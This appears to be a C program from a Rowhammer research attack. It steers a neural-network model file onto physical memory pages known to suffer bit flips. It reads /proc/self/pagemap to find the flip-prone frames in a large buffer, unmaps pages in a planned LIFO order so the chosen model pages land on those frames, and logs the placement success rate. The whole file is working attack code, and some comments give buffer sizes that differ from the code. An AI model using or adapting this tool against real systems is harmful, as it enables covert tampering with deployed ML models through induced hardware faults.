#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <errno.h>
#include <time.h>
#include <json-c/json.h>

#define PAGE_SIZE 4096
#define BUFFER_SIZE (7UL * 1024 * 1024 * 1024)  // 7GB

// Structure to store target page mapping
typedef struct {
    int dnn_page_id;          // DNN page index (e.g., 800)
    int dram_page;            // DRAM page number (e.g., 10446)
    uint64_t physical_page;   // Physical page number from bitflip matrix
    uint64_t virtual_addr;    // Virtual address in our buffer that maps to this physical page
    int found;                // Whether we found this page in our buffer
} TargetPage;

// Get physical address from virtual address
static uint64_t get_physical_addr(uint64_t virtual_addr) {
    static int g_pagemap_fd = -1;
    uint64_t value;
    
    if(g_pagemap_fd == -1) {
        g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
        if(g_pagemap_fd == -1) {
            // Only print this once to avoid spam
            static int warned = 0;
            if (!warned) {
                perror("Failed to open /proc/self/pagemap");
                warned = 1;
            }
        }
    }
    if(g_pagemap_fd == -1) return 0;
    
    off_t offset = (virtual_addr / PAGE_SIZE) * sizeof(value);
    int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
    if(got != 8) {
        static int read_warned = 0;
        if (!read_warned) {
            fprintf(stderr, "pread from pagemap failed: got %d bytes, errno=%d\n", got, errno);
            read_warned = 1;
        }
        return 0;
    }
    
    if(!(value & (1ULL << 63))) {
        static int present_warned = 0;
        if (!present_warned) {
            fprintf(stderr, "Page not present in memory (value=0x%lx)\n", value);
            present_warned = 1;
        }
        return 0;
    }
    
    uint64_t frame_num = value & ((1ULL << 55) - 1);
    return frame_num;
}

// Load attack results from JSON file
int load_attack_results(const char* attack_file, const char* bitflip_file, 
                       TargetPage** targets, int* num_targets) {
    /* ------------------------------------------------------------------
     * Decide whether the attack file is JSON or a plain-text report.
     * ------------------------------------------------------------------ */
    const char *dot = strrchr(attack_file, '.');
    int use_json = 0;
    if (dot && strcmp(dot, ".json") == 0) {
        use_json = 1;
    }

    /* ------------------------------------------------------------------
     * Read the attack file entirely into memory.
     * ------------------------------------------------------------------ */
    FILE* fp = fopen(attack_file, "r");
    if (!fp) {
        perror("Failed to open attack results file");
        return -1;
    }
    fseek(fp, 0, SEEK_END);
    long fsize = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    char* attack_buf = malloc(fsize + 1);
    fread(attack_buf, 1, fsize, fp);
    fclose(fp);
    attack_buf[fsize] = '\0';

    /* ------------------------------------------------------------------
     * Parse the attack results.
     * ------------------------------------------------------------------ */
    // Hold the metadata JSON across branches
    json_object* bitflip_json = NULL;
    char* bitflip_json_str = NULL;

    if (use_json) {
        /* ======================= JSON ATTACK FILE ==================== */
        json_object* attack_json = json_tokener_parse(attack_buf);
        if (!attack_json) {
            fprintf(stderr, "Failed to parse attack JSON\n");
            free(attack_buf);
            return -1;
        }

        // Read bit-flip metadata json into memory (common code later expects it)
        FILE* fp2 = fopen(bitflip_file, "r");
        if (!fp2) {
            perror("Failed to open bitflip matrix metadata file");
            json_object_put(attack_json);
            free(attack_buf);
            return -1;
        }
        fseek(fp2, 0, SEEK_END);
        long bfsize = ftell(fp2);
        fseek(fp2, 0, SEEK_SET);
        bitflip_json_str = malloc(bfsize + 1);
        fread(bitflip_json_str, 1, bfsize, fp2);
        fclose(fp2);
        bitflip_json_str[bfsize] = '\0';
        bitflip_json = json_tokener_parse(bitflip_json_str);
        if (!bitflip_json) {
            fprintf(stderr, "Failed to parse bitflip JSON\n");
            json_object_put(attack_json);
            free(attack_buf);
            free(bitflip_json_str);
            return -1;
        }

        // Count number of target pages
        *num_targets = 0;
        json_object* results_array;
        if (json_object_object_get_ex(attack_json, "successful_attacks", &results_array)) {
            *num_targets = json_object_array_length(results_array);
        }
        if (*num_targets == 0) {
            fprintf(stderr, "No target pages found in attack JSON\n");
            json_object_put(attack_json);
            json_object_put(bitflip_json);
            free(attack_buf);
            free(bitflip_json_str);
            return -1;
        }
        *targets = calloc(*num_targets, sizeof(TargetPage));

        // Parse JSON entries
        for (int i = 0; i < *num_targets; i++) {
            json_object* result = json_object_array_get_idx(results_array, i);
            json_object* dnn_page_obj;
            json_object* dram_page_obj;
            if (json_object_object_get_ex(result, "dnn_page_id", &dnn_page_obj) &&
                json_object_object_get_ex(result, "dram_page_id", &dram_page_obj)) {
                (*targets)[i].dnn_page_id = json_object_get_int(dnn_page_obj);
                (*targets)[i].dram_page   = json_object_get_int(dram_page_obj);
            }
        }

        // Cleanup JSON attack; retain bitflip_json for common block below
        json_object_put(attack_json);

        /* continue to PHYSICAL lookup using bitflip_json below */

        // --- COMMON LOOKUP BLOCK placed after #else ---

        // We fall through after the else branch.

        /* ------------------------------------------ */

        /* Reuse code below by temporarily storing bitflip_json and bitflip_json_str.
           We will jump to COMMON_LOOKUP after preparing data structures */

        // set pointer variables for common block
        goto COMMON_LOOKUP;

    } else {
        /* =================== PLAIN-TEXT ATTACK FILE =================== */
        // Count pairs of "DNN Page ID:" occurrences
        int count = 0;
        for (char* p = attack_buf; (p = strstr(p, "DNN Page ID:")); p += 12) {
            count++;
        }
        if (count == 0) {
            fprintf(stderr, "Could not find any 'DNN Page ID:' entries in report\n");
            free(attack_buf);
            return -1;
        }

        *num_targets = count;
        *targets = calloc(count, sizeof(TargetPage));

        char* p = attack_buf;
        for (int i = 0; i < count; i++) {
            p = strstr(p, "DNN Page ID:");
            sscanf(p, "DNN Page ID:%d", &(*targets)[i].dnn_page_id);
            p = strstr(p, "DRAM Page ID:");
            if (!p) {
                fprintf(stderr, "Mismatch between DNN and DRAM IDs in report\n");
                free(attack_buf);
                free(*targets);
                return -1;
            }
            sscanf(p, "DRAM Page ID:%d", &(*targets)[i].dram_page);
        }

        /* Read bitflip metadata JSON */
        FILE* fp2 = fopen(bitflip_file, "r");
        if (!fp2) {
            perror("Failed to open bitflip matrix metadata file");
            free(attack_buf);
            free(*targets);
            return -1;
        }
        fseek(fp2, 0, SEEK_END);
        long bfsize = ftell(fp2);
        fseek(fp2, 0, SEEK_SET);
        bitflip_json_str = malloc(bfsize + 1);
        fread(bitflip_json_str, 1, bfsize, fp2);
        fclose(fp2);
        bitflip_json_str[bfsize] = '\0';
        bitflip_json = json_tokener_parse(bitflip_json_str);
        if (!bitflip_json) {
            fprintf(stderr, "Failed to parse bitflip JSON\n");
            free(attack_buf);
            free(*targets);
            free(bitflip_json_str);
            return -1;
        }

        /* Store pointer to allow common lookup */
        // fall through to common lookup with bitflip_json/bitflip_json_str available

        goto COMMON_LOOKUP;
    }

COMMON_LOOKUP:
    ; /* label requires statement */
    /* At this point: *targets, *num_targets are set; bitflip_json and
       bitflip_json_str hold the parsed metadata JSON. */

    /* bitflip_json / bitflip_json_str are now set by the branch above */

    // Look up physical pages in bitflip matrix
    for (int i = 0; i < *num_targets; i++) {
        // Skip if dram_page not set (should not happen)
        int dram_id = (*targets)[i].dram_page;
        (*targets)[i].physical_page = 0;
        (*targets)[i].found = 0;
        (*targets)[i].virtual_addr = 0;

        json_object* page_info_array;
        if (json_object_object_get_ex(bitflip_json, "page_info", &page_info_array)) {
            int n_pages = json_object_array_length(page_info_array);
            for (int j = 0; j < n_pages; j++) {
                json_object* page_info = json_object_array_get_idx(page_info_array, j);
                json_object* row_idx_obj;
                if (json_object_object_get_ex(page_info, "row_index", &row_idx_obj)) {
                    if (json_object_get_int(row_idx_obj) == dram_id) {
                        json_object* page_obj;
                        if (json_object_object_get_ex(page_info, "phys_page_number", &page_obj)) {
                            const char* page_str = json_object_get_string(page_obj);
                            (*targets)[i].physical_page = strtoull(page_str, NULL, 16);
                        }
                        break;
                    }
                }
            }
            if (!(*targets)[i].physical_page) {
                fprintf(stderr, "WARNING: DRAM page %d not found in bitflip matrix\n", dram_id);
            }
        }
    }

    json_object_put(bitflip_json);
    free(bitflip_json_str);
    free(attack_buf);
    return 0; }

// Search for target physical pages in the allocated buffer
void search_target_pages(uint8_t* buffer, size_t buffer_size, 
                        TargetPage* targets, int num_targets) {
    size_t num_pages = buffer_size / PAGE_SIZE;
    
    printf("Searching for %d target pages in %zu buffer pages...\n", 
           num_targets, num_pages);
    
    for (size_t i = 0; i < num_pages; i++) {
        uint64_t virt_addr = (uint64_t)(buffer + i * PAGE_SIZE);
        uint64_t phys_page = get_physical_addr(virt_addr);
        
        // Check if this physical page matches any target
        for (int j = 0; j < num_targets; j++) {
            if (!targets[j].found && targets[j].physical_page != 0 && 
                phys_page == targets[j].physical_page) {
                targets[j].virtual_addr = virt_addr;
                targets[j].found = 1;
                printf("Found target: DNN page %d -> DRAM page %d -> "
                       "Physical page 0x%lx at virtual 0x%lx\n",
                       targets[j].dnn_page_id, targets[j].dram_page,
                       targets[j].physical_page, virt_addr);
            }
        }
    }
    
    // Report missing pages
    int missing = 0;
    for (int i = 0; i < num_targets; i++) {
        if (!targets[i].found && targets[i].physical_page != 0) {
            missing++;
            fprintf(stderr, "WARNING: Could not find physical page 0x%lx "
                   "for DNN page %d (DRAM page %d)\n",
                   targets[i].physical_page, targets[i].dnn_page_id,
                   targets[i].dram_page);
        }
    }
    
    printf("Found %d/%d target pages\n", num_targets - missing, num_targets);
}

// Map model to targeted pages
int map_model_to_targets(const char* model_file, uint8_t* buffer, 
                        size_t buffer_size, TargetPage* targets, 
                        int num_targets) {
    // Open model file
    int model_fd = open(model_file, O_RDONLY);
    if (model_fd == -1) {
        perror("Failed to open model file");
        return -1;
    }
    
    struct stat sb;
    fstat(model_fd, &sb);
    
    size_t model_pages = (sb.st_size + PAGE_SIZE - 1) / PAGE_SIZE;
    printf("\nModel size: %ld bytes (%zu pages)\n", sb.st_size, model_pages);
    
    printf("\n==== Don't Knock Approach: Create mapping plan then LIFO unmap ====\n");
    
    // 1. Create a list of which buffer pages to use (only model_pages worth!)
    size_t* pages_to_use = malloc(model_pages * sizeof(size_t));
    int* slot_used = calloc(model_pages, sizeof(int));  // Track which slots are filled
    
    if (model_pages > buffer_size / PAGE_SIZE) {
        fprintf(stderr, "ERROR: Model (%zu pages) larger than buffer (%zu pages)\n", 
                model_pages, buffer_size / PAGE_SIZE);
        free(pages_to_use);
        free(slot_used);
        close(model_fd);
        return -1;
    }
    
    // 2. First, place flippy pages at their required positions
    printf("Placing flippy pages:\n");
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].found && targets[i].dnn_page_id < model_pages) {
            size_t buffer_page = (targets[i].virtual_addr - (uint64_t)buffer) / PAGE_SIZE;
            
            // Due to LIFO: last unmapped -> first allocated
            // So model page N needs to be at position (model_pages - 1 - N)
            size_t slot = model_pages - 1 - targets[i].dnn_page_id;
            
            pages_to_use[slot] = buffer_page;
            slot_used[slot] = 1;
            
            printf("  Model page %d -> slot %zu -> buffer page %zu\n",
                   targets[i].dnn_page_id, slot, buffer_page);
        }
    }
    
    // 3. Fill remaining slots with non-flippy buffer pages
    size_t next_buffer_page = 0;
    for (size_t slot = 0; slot < model_pages; slot++) {
        if (!slot_used[slot]) {
            // Find next non-flippy page
            int found = 0;
            while (next_buffer_page < buffer_size / PAGE_SIZE && !found) {
                // Check if this buffer page is flippy
                int is_flippy = 0;
                for (int j = 0; j < num_targets; j++) {
                    if (targets[j].found) {
                        size_t flippy_page = (targets[j].virtual_addr - (uint64_t)buffer) / PAGE_SIZE;
                        if (next_buffer_page == flippy_page) {
                            is_flippy = 1;
                            break;
                        }
                    }
                }
                
                if (!is_flippy) {
                    pages_to_use[slot] = next_buffer_page;
                    found = 1;
                }
                next_buffer_page++;
            }
            
            if (!found) {
                fprintf(stderr, "ERROR: Not enough non-flippy pages!\n");
                free(pages_to_use);
                free(slot_used);
                close(model_fd);
                return -1;
            }
        }
    }
    
    // 4. Now unmap these specific pages in order
    printf("\nUnmapping %zu pages in order:\n", model_pages);
    
    
    for (size_t i = 0; i < model_pages; i++) {

        if (munmap(buffer + pages_to_use[i] * PAGE_SIZE, PAGE_SIZE) != 0) {
            perror("munmap failed");
            // Continue anyway - page might already be unmapped
        }
    }

    void* model_buffer = mmap(NULL, sb.st_size, PROT_READ,
                             MAP_PRIVATE, model_fd, 0);
    
    if (model_buffer == MAP_FAILED) {
        perror("Failed to map model file");
        free(pages_to_use);
        free(slot_used);
        close(model_fd);
        return -1;
    }
    
    // 6. Touch all pages to ensure they're allocated
    printf("Forcing page allocation...\n");
    volatile char dummy;
    for (size_t i = 0; i < model_pages; i++) {
        dummy = ((char*)model_buffer)[i * PAGE_SIZE];
    }
    
    printf("Model mapped at: 0x%lx\n", (uint64_t)model_buffer);
    
    
    free(pages_to_use);
    free(slot_used);

    
    // Verify mapping results
    printf("\nVerifying target mappings:\n");
    printf("%-15s %-20s %-20s %-10s\n", "DNN Page", "Expected Phys", "Actual Phys", "Status");
    printf("---------------------------------------------------------------\n");
    
    int success_count = 0;
    int total_checked = 0;
    
    for (int i = 0; i < num_targets; i++) {
        if (targets[i].dnn_page_id < model_pages) {
            total_checked++;
            uint64_t model_page_addr = (uint64_t)((char*)model_buffer + 
                                      targets[i].dnn_page_id * PAGE_SIZE);
            uint64_t actual_phys = get_physical_addr(model_page_addr);
            
            if (targets[i].found) {
                if (actual_phys == targets[i].physical_page) {
                    printf("%-15d 0x%-18lx 0x%-18lx SUCCESS\n",
                           targets[i].dnn_page_id, targets[i].physical_page, 
                           actual_phys);
                    success_count++;
                } else {
                    printf("%-15d 0x%-18lx 0x%-18lx FAILED\n",
                           targets[i].dnn_page_id, targets[i].physical_page, 
                           actual_phys);
                }
            } else {
                printf("%-15d 0x%-18lx 0x%-18lx NOT_FOUND\n",
                       targets[i].dnn_page_id, targets[i].physical_page, 
                       actual_phys);
            }
        }
    }
    
    printf("\nSuccessfully mapped %d/%d target pages (%.1f%% success rate)\n", 
           success_count, total_checked, 
           total_checked > 0 ? (100.0 * success_count / total_checked) : 0);
    
    // Save results...
    FILE* fp = fopen("targeted_mapping_results.txt", "w");
    if (fp) {
        fprintf(fp, "Targeted Model Mapping Results\n");
        fprintf(fp, "==============================\n");
        fprintf(fp, "Model: %s\n", model_file);
        fprintf(fp, "Model Size: %ld bytes (%zu pages)\n", sb.st_size, model_pages);
        fprintf(fp, "Buffer Size: %zu bytes\n", buffer_size);
        fprintf(fp, "Target Pages: %d\n", num_targets);
        fprintf(fp, "Success Rate: %.1f%%\n\n", 
                total_checked > 0 ? (100.0 * success_count / total_checked) : 0);
        
        fprintf(fp, "All Model Page Mappings:\n");
        fprintf(fp, "------------------------\n");
        
        for (size_t i = 0; i < model_pages; i++) {
            uint64_t vaddr = (uint64_t)((char*)model_buffer + i * PAGE_SIZE);
            uint64_t paddr = get_physical_addr(vaddr);
            
            fprintf(fp, "DNN Page %4zu: Virtual 0x%lx -> Physical 0x%lx",
                    i, vaddr, paddr);
            
            // Check if this was a target
            for (int j = 0; j < num_targets; j++) {
                if (targets[j].dnn_page_id == (int)i) {
                    if (targets[j].found && paddr == targets[j].physical_page) {
                        fprintf(fp, " [TARGET - SUCCESS]");
                    } else if (targets[j].found) {
                        fprintf(fp, " [TARGET - FAILED: expected 0x%lx]", 
                                targets[j].physical_page);
                    } else {
                        fprintf(fp, " [TARGET - NOT FOUND IN BUFFER]");
                    }
                    break;
                }
            }
            fprintf(fp, "\n");
        }
        
        fclose(fp);
        printf("\nDetailed mapping results saved to targeted_mapping_results.txt\n");
    }
    
    // Save target page summary
    fp = fopen("target_pages_summary.txt", "w");
    if (fp) {
        fprintf(fp, "Target Pages Summary\n");
        fprintf(fp, "===================\n\n");
        
        for (int i = 0; i < num_targets; i++) {
            fprintf(fp, "Target %d:\n", i + 1);
            fprintf(fp, "  DNN Page ID: %d\n", targets[i].dnn_page_id);
            fprintf(fp, "  DRAM Page: %d\n", targets[i].dram_page);
            fprintf(fp, "  Physical Page: 0x%lx\n", targets[i].physical_page);
            fprintf(fp, "  Found in Buffer: %s\n", targets[i].found ? "Yes" : "No");
            
            if (targets[i].dnn_page_id < model_pages) {
                uint64_t model_page_addr = (uint64_t)((char*)model_buffer + 
                                          targets[i].dnn_page_id * PAGE_SIZE);
                uint64_t actual_phys = get_physical_addr(model_page_addr);
                fprintf(fp, "  Actual Physical: 0x%lx\n", actual_phys);
                fprintf(fp, "  Mapping Status: %s\n", 
                        (targets[i].found && actual_phys == targets[i].physical_page) 
                        ? "SUCCESS" : "FAILED");
            } else {
                fprintf(fp, "  Mapping Status: DNN page out of range\n");
            }
            fprintf(fp, "\n");
        }
        
        fclose(fp);
        printf("Target pages summary saved to target_pages_summary.txt\n");
    }
    
    close(model_fd);
    
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Usage: %s <model.bin> <attack_results.json> "
                "<device2_1G_metadata.json>\n", argv[0]);
        return 1;
    }
    
    const char* model_file = argv[1];
    const char* attack_file = argv[2];
    const char* bitflip_file = argv[3];
    
    // Load target pages from JSON files
    TargetPage* targets = NULL;
    int num_targets = 0;
    
    if (load_attack_results(attack_file, bitflip_file, &targets, &num_targets) < 0) {
        return 1;
    }
    
    printf("Loaded %d target page mappings\n", num_targets);
    
    // Allocate 4GB buffer
    printf("\nAllocating 6GB buffer...\n");
    uint8_t* buffer = mmap(NULL, BUFFER_SIZE, PROT_READ | PROT_WRITE,
                          MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    
    if (buffer == MAP_FAILED) {
        perror("Failed to allocate buffer");
        free(targets);
        return 1;
    }
    
    // Touch all pages to ensure they're allocated
    printf("Initializing buffer pages...\n");
    for (size_t i = 0; i < BUFFER_SIZE / PAGE_SIZE; i++) {
        buffer[i * PAGE_SIZE] = 0;
    }
    
    // Search for target physical pages
    search_target_pages(buffer, BUFFER_SIZE, targets, num_targets);
    
    // Map model to targeted pages
    if (map_model_to_targets(model_file, buffer, BUFFER_SIZE, 
                            targets, num_targets) < 0) {
        munmap(buffer, BUFFER_SIZE);
        free(targets);
        return 1;
    }
    
    // Cleanup
    munmap(buffer, BUFFER_SIZE);
    free(targets);
    
    return 0;
} 